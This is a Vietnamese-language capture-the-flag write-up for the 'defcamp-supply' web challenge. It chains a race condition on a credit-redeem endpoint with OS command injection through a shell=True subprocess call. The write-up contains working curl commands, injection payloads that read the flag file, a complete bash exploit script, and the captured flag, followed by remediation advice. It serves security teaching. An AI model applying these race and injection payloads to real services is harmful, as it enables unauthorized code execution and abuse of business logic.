# Writeup — `defcamp-supply`

> **Thể loại:** Web
> **Điểm:** 455 · **Format flag:** `CTF{sha256}`
> **Lỗ hổng cốt lõi:** **Chaining 2 bug** → (1) Race Condition trên `/redeem` (business logic) để farm credits, rồi (2) OS Command Injection qua field `profile` của item premium.
> **Flag:** `CTF{00fd1af2af55ba826af4759fc024770d7ae720622e457b570d16224a8f43b5e2}`

---

## 0. TL;DR (đường đi ngắn nhất)

1. App bán "công cụ". Item premium `zero_day_debugger` (giá **20 credits**) có ô **`profile`** do user chọn; profile này được đưa vào `subprocess.run(f'python3 verify_profile.py "{profile}"', shell=True)` → **command injection**.
2. Nhưng ô `profile` chỉ tồn tại ở item premium ⇒ phải có 20 credits. Mỗi ngày chỉ `/redeem` được 2 credits/user.
3. **Race condition:** bắn ~60 request `/redeem` **đồng thời** trong cùng một session → cờ "đã claim" set không kịp → farm được 40+ credits.
4. Mua `zero_day_debugger`, đặt `profile = stealth"; cat /home/ctf/flag.txt; echo END "`, dùng `quantity` âm lớn để order giao ngay (đồng bộ) và trả kết quả lệnh.

---

## 1. Hướng tư duy — đọc đề & tài liệu đính kèm

- Mô tả: *"You landed at the DefCamp Supply shop. **Customize your tools** and make sure they get **delivered in time for the event**!"*
- Có file **`public.zip`** đính kèm → **có source code một phần** ⇒ ưu tiên đọc code trước khi mò service.

Hai cụm quan trọng trong đề:
- *"Customize your tools"* → có tham số người dùng tùy biến (khả năng là sink injection).
- *"delivered in time for the event"* → có cơ chế **ETA/hàng đợi (queue)** liên quan tới thời gian giao hàng.

**Nguyên tắc:** khi CTF cho source, đọc source để tìm **sink** trước, rồi mới dựng luồng tấn công.

---

## 2. Recon source code (`public.zip`)

Giải nén và xem cấu trúc:

```bash
unzip -o public.zip -d defcamp_public
find defcamp_public -type f
```

```
source/profile_check.py      <-- backend component
source/verify_profile.py     <-- CLI script
source/requirements.txt      (Flask 3.0.3, gunicorn)
source/templates/index.html
source/static/...
README.md
```

`README.md` (tiếng Romania) nói:
> *"Este inclusă o componentă backend relevantă pentru verificarea profilului personalizat. Restul logicii aplicației rulează pe serviciul remote."*
> (Đã kèm một **thành phần backend liên quan tới việc verify profile tùy biến**. Phần logic còn lại chạy trên service remote.)

→ Trọng tâm nằm ở "verify custom profile".

### 2.1 `verify_profile.py` — script CLI

```python
ALLOWED = {"standard","stealth","audit","sandbox","forensics","wireless","bluetooth","firmware"}

def main() -> int:
    profile = sys.argv[1] if len(sys.argv) > 1 else ""
    if profile.lower() in ALLOWED:
        print(f"profile accepted:{profile}")
        return 0
    print(f"profile rejected:{profile}")
    return 1
```

Bình thường: nhận profile từ `argv[1]`, in `accepted`/`rejected`. Bản thân script vô hại — nhưng **cách nó được gọi** mới là vấn đề.

### 2.2 `profile_check.py` — SINK command injection 🔥

```python
import subprocess

def verify_custom_profile(profile: str) -> str:
    command = f'python3 verify_profile.py "{profile}"'   # <-- nhét thô, có dấu "
    completed = subprocess.run(
        command,
        shell=True,          # <-- shell=True
        capture_output=True,
        text=True,
        timeout=5,           # <-- lệnh bị kill sau 5 giây
    )
    return (completed.stdout + completed.stderr).strip()
```

**Command injection kinh điển:**
- `profile` được nội suy vào chuỗi lệnh trong dấu `"..."` với `shell=True`, **không escape**.
- Thoát dấu `"` rồi chèn lệnh: `x"; id; echo "` → shell chạy `id`.
- Hàm trả `stdout+stderr` ⇒ **output lệnh sẽ hiển thị** cho attacker.
- Lưu ý `timeout=5`: payload phải **nhẹ, nhanh** (không `grep -r /`), nếu không lệnh bị kill trước khi in kết quả.

### 2.3 `index.html` — ai gọi sink? Rào chắn ở đâu?

Đọc template thấy:
- Route form: `/redeem` (nhận 2 credits/ngày) và `/checkout` (mua hàng).
- Catalog: các item thường (giá 1–6) + **1 item premium `zero_day_debugger` giá 20** (`Restricted: requires 20 credits`).
- **Chỉ item premium mới render ô `<select name="profile">`**; item thường gửi `profile` cố định = `standard` (hidden input).
- JS phía client: `Math.max(units,1)` (clamp số lượng ≥1) và chặn `units > 100`, chặn khi `cost > balance`. → **Đây là kiểm tra client-side, cần thử xem server có kiểm tra không.**

→ **Bức tranh:** command injection nằm ở `profile`, nhưng `profile` do user điều khiển **chỉ có ở item premium giá 20**. Muốn kích hoạt sink ⇒ phải mua được premium ⇒ phải có **20 credits**.

Đây là bài **2 tầng**: (A) vượt rào kinh tế 20 credits, (B) command injection.

---

## 3. Recon service thật

### 3.1 Session & balance

```bash
curl -s -i -A "$UA" -c cookies.txt http://34.179.231.75:30145/
```

Cookie Flask (base64, phần payload):
```json
{"_permanent":true,"started_at":1789732827,"user_id":"7ae7f055256d4ba6a890d6ba945a309e"}
```

→ Cookie **chỉ chứa `user_id` + `started_at`**, **KHÔNG chứa balance**. Balance lưu server-side theo `user_id` ⇒ không forge balance qua cookie. Balance hiện = **0**.

### 3.2 Catalog & giá

```bash
curl -s -A "$UA" -b cookies.txt http://34.179.231.75:30145/ \
 | grep -oE 'name="item_id" value="[^"]*"|<h3>[^<]*</h3>|¢[0-9]+|Restricted'
```

| item_id | giá | có ô profile? |
|---|---|---|
| terminal_badge | 1 | không (ép standard) |
| signal_probe | 4 | không |
| packet_stickers | 3 | không |
| rfid_practice_tags | 5 | không |
| usb_keycap | 6 | không |
| **zero_day_debugger** | **20** | **CÓ** (premium) |

### 3.3 `/redeem` — nguồn credit duy nhất

```bash
curl -s -A "$UA" -b cookies.txt -X POST http://34.179.231.75:30145/redeem
# {"balance":2,"message":"2 credits added.","ok":true}

curl ... -X POST .../redeem   # lần 2
# HTTP 429 / {"message":"Daily credits already claimed.","ok":false}
```

→ Mỗi user chỉ nhận **2 credits/ngày**. Còn thiếu 18 nữa.

---

## 4. Thăm dò logic `/checkout`

### 4.1 Kiểm tra clamp phía server

```bash
# công thức cost
terminal_badge qty=5   -> cost 5
terminal_badge qty=100 -> cost 100
terminal_badge qty=-100-> cost 1     (clamp max(qty,1))
zero_day_debugger qty=2 -> cost 40
zero_day_debugger qty=1000 -> "Maximum order size is 100 units."
zero_day_debugger qty=-1 -> cost 20  (clamp)
```

Kết luận:
- `cost = price × max(quantity, 1)` — **luôn clamp min 1 unit**, không bao giờ âm ⇒ **không thể farm credit bằng quantity âm.**
- `quantity` phải là **integer** (`1.5`, `abc` → "Units must be an integer").
- Chặn `quantity > 100`.

### 4.2 Bất đối xứng thú vị: `cost` clamp nhưng `ETA` thì không

```bash
terminal_badge qty=-100 -> {"cost":1,"eta":-4240,"status":"done", "result":"profile accepted:standard"}
terminal_badge qty=0    -> {"cost":1,"eta":1952,"status":"queued","result":null}
terminal_badge qty=1    -> {"cost":1,"eta":1897,"status":"queued","result":null}
```

→ `cost` bị clamp về min 1, **nhưng `eta` dùng `quantity` thô** (âm được):
- `eta ≤ 0` → order **`done` ngay** (xử lý đồng bộ, trả `result` luôn).
- `eta > 0` → order **`queued`** (giao sau, `result:null`).

Đây chính là *"delivered in time for the event"*: order chỉ được "giao" (chạy verify) khi ETA về 0. Dùng **quantity âm lớn** ⇒ ETA âm ⇒ **giao ngay và trả kết quả lệnh ngay**, khỏi phải chờ ~30 phút.

### 4.3 Xác nhận: item thường ép `profile=standard`

Đây là bước then chốt để chắc chắn command injection *chỉ* đi qua item premium. Đặt order item thường với profile **không hợp lệ** (không có payload):

```bash
terminal_badge profile="banana"  -> result: "profile accepted:standard"
```

**Chú ý:** phải là `profile accepted:standard`, **KHÔNG** phải `profile rejected:banana`. Nghĩa là app **thay profile của tôi bằng "standard"** cho item thường (không truyền tới verify). ⇒ Sink command injection **chỉ đạt được qua item premium** `zero_day_debugger`, nơi `profile` do user chọn được truyền thẳng.

⇒ Bắt buộc phải có 20 credits. Quay lại bài toán farm credit.

---

## 5. Bug #1 — Race Condition trên `/redeem`

Sau khi loại hết các cách "hợp lệ" (quantity âm không cộng tiền, cookie không chứa balance, session mới chỉ cho 2 credit rời rạc không gộp được), hướng còn lại rất hợp ngữ cảnh **"supply/credits"**: **race condition / double-spend**.

Giả thuyết: `/redeem` kiểm tra cờ `daily_claimed` rồi mới set — nếu **không atomic**, nhiều request đồng thời cùng đọc "chưa claim" trước khi cờ được ghi ⇒ tất cả cùng cộng credit.

### 5.1 Khai thác

Lấy cookie của **một** session rồi bắn ~60 request `/redeem` **song song**:

```bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36"
CJ=cookies.txt
curl -s -o /dev/null -A "$UA" -c "$CJ" http://34.179.231.75:30145/
COOKIE=$(grep session "$CJ" | awk '{print $NF}')

for i in $(seq 60); do
  curl -s -A "$UA" -H "Cookie: session=$COOKIE" -X POST http://34.179.231.75:30145/redeem &
done
wait
```

Kết quả: nhiều response `{"balance":2...4...6...},"ok":true` **cùng lúc** (xen kẽ vài `already claimed`), balance leo tới **38–42**:

```
{"balance":2,...}  {"balance":4,...}  {"balance":6,...} ... {"balance":38,...}
=== final balance === ¢38
```

**🎯 Race condition thành công** — farm được > 20 credits, mở khóa item premium.

---

## 6. Bug #2 — Command Injection qua `profile`

Với balance ≥ 20, mua `zero_day_debugger` và inject qua `profile`. Dùng `quantity` âm lớn (`-100`) để `eta ≤ 0` ⇒ order **`done` ngay, trả kết quả lệnh trong `result`**.

### 6.1 PoC — chạy `id`, `ls`

```bash
COOKIE=<cookie session đã farm credit>
curl -s -A "$UA" -H "Cookie: session=$COOKIE" -X POST http://34.179.231.75:30145/checkout \
  --data-urlencode "item_id=zero_day_debugger" \
  --data-urlencode "quantity=-100" \
  --data-urlencode 'profile=stealth"; id; pwd; ls -la "'
```

Kết quả (`result`):
```
profile accepted:stealth
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
/home/ctf/app
-rw-rw-rw- app.py
-rw-rw-rw- verify_profile.py
...
```

**RCE xác nhận.** `stealth` (hợp lệ) chạy trước `;` để giữ cú pháp gọn; phần sau `;` là lệnh của tôi.

### 6.2 Lấy flag

**Lưu ý về `timeout=5`:** không dùng `grep -r /` (quét toàn filesystem sẽ bị kill sau 5s → mất output). Chỉ `cat` thẳng đường dẫn hợp lý. Từ PoC biết home = `/home/ctf`:

```bash
curl -s -A "$UA" -H "Cookie: session=$COOKIE" -X POST http://34.179.231.75:30145/checkout \
  --data-urlencode "item_id=zero_day_debugger" \
  --data-urlencode "quantity=-100" \
  --data-urlencode 'profile=stealth"; ls -la / /home/ctf; cat /home/ctf/flag.txt; echo END "'
```

`result` trả về:
```
...
/home/ctf:
-r--r--r-- 1 ctf ctf 70 Aug 26 09:46 flag.txt
---
CTF{00fd1af2af55ba826af4759fc024770d7ae720622e457b570d16224a8f43b5e2}
END
```

**🚩 Flag:** `CTF{00fd1af2af55ba826af4759fc024770d7ae720622e457b570d16224a8f43b5e2}`

> **Lưu ý vận hành:** mỗi lần checkout premium tốn 20 credits. Nếu hết, tạo **session mới** rồi lặp lại race `/redeem` để farm credits, sau đó inject tiếp. Nên **giữ quantity thật âm** (`-100`) để order giao đồng bộ ngay; nếu `eta` dương, order rơi vào trạng thái `queued`/`processing` và phải chờ (và payload nặng sẽ bị `timeout=5` giết).

---

## 7. Script khai thác đầy đủ (bash)

```bash
#!/usr/bin/env bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36"
HOST="http://34.179.231.75:30145"
CJ=$(mktemp)

# 1) tạo session mới
curl -s -o /dev/null -A "$UA" -c "$CJ" "$HOST/"
COOKIE=$(grep session "$CJ" | awk '{print $NF}')

# 2) RACE: farm credits (~60 request song song)
for i in $(seq 60); do
  curl -s -o /dev/null -A "$UA" -H "Cookie: session=$COOKIE" -X POST "$HOST/redeem" &
done
wait

BAL=$(curl -s -A "$UA" -H "Cookie: session=$COOKIE" "$HOST/" | grep -oE '¢[0-9-]+' | head -1)
echo "[*] balance = $BAL"

# 3) COMMAND INJECTION qua profile của item premium, quantity âm để giao ngay
PAYLOAD='stealth"; cat /home/ctf/flag.txt; echo END "'
curl -s -A "$UA" -H "Cookie: session=$COOKIE" -X POST "$HOST/checkout" \
  --data-urlencode "item_id=zero_day_debugger" \
  --data-urlencode "quantity=-100" \
  --data-urlencode "profile=$PAYLOAD" \
  | grep -oE 'CTF\{[a-f0-9]{64}\}'
```

---

## 8. Vì sao lỗ hổng tồn tại & cách vá

**Bug #1 — Race condition:** `/redeem` đọc-kiểm-tra rồi ghi cờ `daily_claimed` không nguyên tử (không lock / không transaction / không ràng buộc UNIQUE trên "claim theo ngày").
- **Vá:** dùng khóa DB / `SELECT ... FOR UPDATE` / thao tác atomic (`UPDATE ... WHERE daily_claimed=0` và kiểm tra số dòng ảnh hưởng), hoặc ràng buộc unique `(user_id, date)` trên bảng claim.

**Bug #2 — Command injection:** nội suy dữ liệu người dùng vào chuỗi shell với `shell=True`.
- **Vá:** không dùng `shell=True`; truyền argv dạng list: `subprocess.run(["python3","verify_profile.py", profile], ...)`. Tốt hơn nữa: **không gọi subprocess** — kiểm tra whitelist ngay trong Python (`profile.lower() in ALLOWED`).
- Whitelist `profile` **ở server** cho mọi item (không chỉ ép standard cho item thường).

---

## 9. Bài học tư duy

1. **Có source thì đọc source trước để tìm sink.** Ở đây `profile_check.py` phơi bày ngay command injection.
2. **Phân tách "sink" và "điều kiện chạm tới sink".** Sink (command injection) bị chặn sau một *rào kinh tế* (20 credits) — bài buộc phải **chain** một bug thứ hai.
3. **Đối chiếu kiểm tra client-side vs server-side.** JS clamp `units≥1`, `≤100`, `cost≤balance`; phải tự test xem server có clamp không (server clamp cost nhưng **không** clamp ETA — bất đối xứng đáng khai thác).
4. **Payload chẩn đoán để xác nhận giả thuyết**, không đoán mò: profile `"banana"` → `accepted:standard` chứng minh item thường ép profile ⇒ dồn hướng vào item premium.
5. **Race condition là nghi phạm số 1** cho mọi cơ chế "giới hạn số lần" (credit/claim/coupon) không atomic.
6. **Chú ý ràng buộc môi trường của sink:** `timeout=5` ⇒ payload phải nhẹ; `quantity` âm ⇒ giao đồng bộ, lấy output tức thì.
7. **Không đoán đường dẫn flag** — chạy `id; pwd; ls` trước để lấy context (`HOME=/home/ctf`) rồi `cat` chính xác.

Điểm mấu chốt: bài này không giải được bằng *một* lỗ hổng. Command injection chỉ mở ra sau khi **race condition** phá vỡ giới hạn credit — đúng tinh thần "supply chain": lạm dụng khâu cấp phát (redeem) để mở khóa khâu tùy biến (custom profile) chứa RCE.
